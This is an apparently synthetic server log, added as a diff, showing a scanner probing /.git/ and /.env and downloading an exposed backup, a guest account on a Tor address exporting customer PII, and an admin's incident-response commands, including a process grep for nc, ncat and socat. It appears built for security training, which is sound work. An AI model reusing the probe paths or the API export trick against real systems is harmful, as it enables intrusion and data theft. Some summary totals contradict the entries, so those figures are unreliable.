+2026-03-10 15:10:03 - apache2[1105]: 198.51.100.99 - - "GET /.well-known/security.txt HTTP/1.1" 404 512
+2026-03-10 15:10:04 - apache2[1105]: 198.51.100.99 - - "GET /server-status HTTP/1.1" 403 512
+2026-03-10 15:10:05 - apache2[1105]: 198.51.100.99 - - "GET /server-info HTTP/1.1" 403 512
+2026-03-10 15:10:06 - apache2[1105]: 198.51.100.99 - - "GET /.git/ HTTP/1.1" 200 1240 - GIT DIRECTORY ACCESSIBLE (known misconfiguration)
+2026-03-10 15:10:07 - apache2[1105]: 198.51.100.99 - - "GET /.git/config HTTP/1.1" 200 312
+2026-03-10 15:10:08 - apache2[1105]: 198.51.100.99 - - "GET /.env HTTP/1.1" 403 512
+2026-03-10 15:10:09 - apache2[1105]: 198.51.100.99 - - "GET /config.php HTTP/1.1" 403 512
+2026-03-10 15:10:10 - apache2[1105]: 198.51.100.99 - - "GET /backup.sql HTTP/1.1" 404 512
+2026-03-10 15:10:11 - apache2[1105]: 198.51.100.99 - - "GET /backup.zip HTTP/1.1" 200 48291840 - BACKUP ARCHIVE DOWNLOADED BY SCANNER
+2026-03-10 15:10:55 - apache2[1105]: 198.51.100.99 - - "GET /phpinfo.php HTTP/1.1" 404 512
+2026-03-10 15:11:00 - apache2[1105]: 198.51.100.99 - - "GET /xmlrpc.php HTTP/1.1" 404 512
+2026-03-10 15:11:01 - apache2[1105]: 198.51.100.99 - - "GET /wp-json/wp/v2/users HTTP/1.1" 404 512
+2026-03-10 15:20:00 - ufw[1250]: Rule added: DENY IN from 198.51.100.99 (admin manual block - automated scanner)
+
+# ---------------------------------------------------------------------------
+# SECTION 12: LATE AFTERNOON / EVENING NORMAL OPERATIONS (15:30 - 22:00)
+# ---------------------------------------------------------------------------
+
+2026-03-10 15:30:00 - User: admin - Action: Command - CMD: "sudo nano /etc/apache2/conf-available/security.conf" - Session: ssh-sess-006
+2026-03-10 15:31:00 - User: admin - Action: Command - CMD: "echo 'Options -Indexes' >> /etc/apache2/conf-available/security.conf" - Session: ssh-sess-006
+2026-03-10 15:31:10 - User: admin - Action: Command - CMD: "echo 'ServerTokens Prod' >> /etc/apache2/conf-available/security.conf" - Session: ssh-sess-006
+2026-03-10 15:31:30 - User: admin - Action: Command - CMD: "sudo a2enconf security && sudo systemctl reload apache2" - Session: ssh-sess-006
+2026-03-10 15:32:00 - systemd[1]: Reloading apache2.service - Apache security hardening applied.
+2026-03-10 15:35:00 - User: admin - Action: Command - CMD: "sudo chmod 750 /var/www/html/backup.zip" - Session: ssh-sess-006 - NOTE: Fixing backup file permissions
+2026-03-10 15:35:05 - User: admin - Action: Command - CMD: "sudo mv /var/www/html/backup.zip /mnt/secure_backups/" - Session: ssh-sess-006
+2026-03-10 15:40:00 - User: admin - Action: Logout - Session: ssh-sess-006 - Duration: 3h35m00s
+2026-03-10 16:00:01 - CRON[3100]: (www-data) CMD (/usr/bin/php /var/www/html/cron/cleanup.php)
+2026-03-10 16:00:03 - mysqld[1210]: [Note] Purged binary logs up to mysql-bin.000142.
+2026-03-10 17:00:00 - apache2[1105]: 203.0.113.45 - - "GET /index.html HTTP/1.1" 200 4523
+2026-03-10 17:15:00 - apache2[1105]: 198.51.100.88 - - "POST /contact.php HTTP/1.1" 200 2102
+2026-03-10 18:00:01 - CRON[3200]: (root) CMD (/usr/bin/rsync -az /var/www/html /mnt/backup/html)
+2026-03-10 18:00:42 - rsync[3201]: sent 14,239,100 bytes received 324 bytes 9,492,948 bytes/sec
+2026-03-10 18:30:00 - apache2[1105]: 203.0.113.101 - - "GET /login.php HTTP/1.1" 200 3210
+2026-03-10 18:30:30 - apache2[1105]: 203.0.113.101 - - "POST /login.php HTTP/1.1" 302 0 - Successful login: user=analyst2
+2026-03-10 19:00:00 - mysqld[1210]: Query_time: 0.0019 Rows_examined: 89 SELECT * FROM sessions WHERE last_active < NOW() - INTERVAL 30 MINUTE
+2026-03-10 20:00:01 - CRON[3300]: (www-data) CMD (/usr/bin/php /var/www/html/cron/session_cleanup.php)
+2026-03-10 20:00:02 - mysqld[1210]: [Note] Deleted 14 expired sessions.
+2026-03-10 21:00:00 - apache2[1105]: 203.0.113.200 - - "GET /index.html HTTP/1.1" 200 4523
+2026-03-10 22:00:00 - User: analyst2 - Action: Logout - Session: web-sess-0512 - Duration: 3h29m30s
+
+# ---------------------------------------------------------------------------
+# SECTION 13: LATE NIGHT - SUSPICIOUS ACTIVITY (22:15 - 23:05)
+# Attacker returns via compromised guest credentials
+# Technique: T1078 - Valid Accounts (MITRE ATT&CK)
+# ---------------------------------------------------------------------------
+
+2026-03-10 22:15:00 - User: guest - Action: Login Success - IP: 185.220.101.45 - Method: password - Session: web-sess-0601
+# NOTE: 185.220.101.45 is a known Tor exit node - unusual for guest account
+2026-03-10 22:15:01 - auditd[1500]: [WARNING] Login from known Tor exit node: 185.220.101.45. User: guest.
+2026-03-10 22:15:10 - apache2[1105]: 185.220.101.45 - - "GET /dashboard.php HTTP/1.1" 200 4200
+2026-03-10 22:15:20 - apache2[1105]: 185.220.101.45 - - "GET /api/v1/users HTTP/1.1" 403 512
+2026-03-10 22:15:30 - apache2[1105]: 185.220.101.45 - - "GET /api/v1/users?debug=1 HTTP/1.1" 403 512
+2026-03-10 22:15:45 - apache2[1105]: 185.220.101.45 - - "GET /api/v1/orders?export=csv HTTP/1.1" 200 524288 - Exported 512KB order data
+2026-03-10 22:16:00 - apache2[1105]: 185.220.101.45 - - "GET /api/v1/customers?export=csv HTTP/1.1" 200 1048576 - Exported 1MB customer PII data
+2026-03-10 22:16:10 - auditd[1500]: [CRITICAL] PII DATA EXPORT: guest account exported customer data (1MB) via API to Tor exit node 185.220.101.45. Incident #INC-2026-0310-001.
+2026-03-10 22:16:15 - apache2[1105]: 185.220.101.45 - - "GET /api/v1/logs?start=2026-03-01 HTTP/1.1" 403 512
+2026-03-10 22:18:00 - apache2[1105]: 185.220.101.45 - - "POST /api/v1/upload HTTP/1.1" 403 512 - Upload blocked for guest
+2026-03-10 22:20:00 - auditd[1500]: [ALERT] Automated response: guest account API rate limit exceeded. Throttling to 1 req/min.
+2026-03-10 22:25:00 - User: guest - Action: Logout - Session: web-sess-0601 - Duration: 10m00s
+
+# ---------------------------------------------------------------------------
+# SECTION 14: INCIDENT RESPONSE - ADMIN LOCKDOWN (22:30 - 23:15)
+# ---------------------------------------------------------------------------
+
+2026-03-10 22:30:00 - User: admin - Action: Login Success - IP: 192.168.1.5 - Method: publickey - Session: ssh-sess-007 (IR RESPONSE)
+2026-03-10 22:30:10 - User: admin - Action: Command - CMD: "sudo usermod -L guest" - Result: SUCCESS
+2026-03-10 22:30:15 - User: admin - Action: Command - CMD: "sudo ufw deny from 185.220.101.45" - Result: SUCCESS
+2026-03-10 22:30:20 - User: admin - Action: Command - CMD: "sudo grep '185.220.101.45' /var/log/apache2/access.log" - Session: ssh-sess-007
+2026-03-10 22:31:00 - User: admin - Action: Command - CMD: "sudo netstat -antp | grep ESTABLISHED" - Session: ssh-sess-007
+2026-03-10 22:31:30 - User: admin - Action: Command - CMD: "sudo ss -tulpn" - Session: ssh-sess-007
+2026-03-10 22:32:00 - User: admin - Action: Command - CMD: "sudo ps aux | grep -E '(nc|ncat|socat|python)'" - Session: ssh-sess-007
+2026-03-10 22:32:30 - User: admin - Action: Command - CMD: "sudo find /var/www/html -newer /var/www/html/index.html -name '*.php'" - Session: ssh-sess-007
+2026-03-10 22:33:00 - User: admin - Action: Command - CMD: "sudo md5sum /var/www/html/*.php > /root/php_hashes_$(date +%Y%m%d).txt" - Session: ssh-sess-007
+2026-03-10 22:40:00 - User: admin - Action: Command - CMD: "sudo systemctl stop apache2" - Session: ssh-sess-007 - NOTE: Site taken offline for IR
+2026-03-10 22:40:01 - systemd[1]: Stopping apache2.service - Apache HTTP Server...
+2026-03-10 22:40:02 - systemd[1]: Stopped apache2.service - Apache HTTP Server.
+2026-03-10 22:45:00 - User: admin - Action: Command - CMD: "sudo cp -a /var/www/html /mnt/forensics/html_snapshot_20260310_2245" - Session: ssh-sess-007
+2026-03-10 22:45:55 - User: admin - Action: Command - CMD: "sudo dd if=/dev/sda of=/mnt/forensics/disk_image_20260310.img bs=4M" - Session: ssh-sess-007
+2026-03-10 23:00:00 - User: admin - Action: Command - CMD: "sudo systemctl start apache2" - Session: ssh-sess-007 - NOTE: Site restored after IR snapshot
+2026-03-10 23:00:01 - systemd[1]: Starting apache2.service - Apache HTTP Server...
+2026-03-10 23:00:02 - systemd[1]: Started apache2.service - Apache HTTP Server.
+2026-03-10 23:05:00 - User: admin - Action: Logout - Session: ssh-sess-007 - Duration: 35m00s
+
+# ---------------------------------------------------------------------------
+# SECTION 15: OVERNIGHT RECOVERY AND MONITORING (23:15 - 23:59)
+# ---------------------------------------------------------------------------
+
+2026-03-10 23:15:00 - apache2[1105]: 203.0.113.45 - - "GET /index.html HTTP/1.1" 200 4523 (normal traffic resumes)
+2026-03-10 23:30:00 - rkhunter[3500]: Nightly scan: No rootkit indicators. System integrity verified.
+2026-03-10 23:45:00 - aide[3501]: Nightly integrity check: 3 files changed (admin modifications during IR). All changes attributed to admin (ssh-sess-007). No unauthorized changes.
+2026-03-10 23:50:00 - fail2ban[1700]: Status summary: Banned IPs: 10.0.0.55, 10.0.0.56, 172.16.0.40, 172.16.0.41. Active rules: 4.
+2026-03-10 23:55:01 - CRON[3600]: (root) CMD (/usr/bin/logwatch --mailto soc@cyber.local --detail High)
+2026-03-10 23:55:15 - sendmail[3601]: Message submitted. To: soc@cyber.local, Subject: [ALERT] Security Event Summary - 2026-03-10 - HIGH PRIORITY
+2026-03-10 23:59:59 - auditd[1500]: Daily audit summary: CRITICAL=3, HIGH=4, MEDIUM=7, LOW=12, INFO=248. Incidents filed: INC-2026-0310-001. Review required before 08:00.
+
+# =============================================================================
+# END OF LOG - 2026-03-10 23:59:59
+# Total events: 248 | Critical incidents: 3 | Banned IPs: 4
+# Incident ticket INC-2026-0310-001 created. Assigned to: SOC Team.
+# =============================================================================
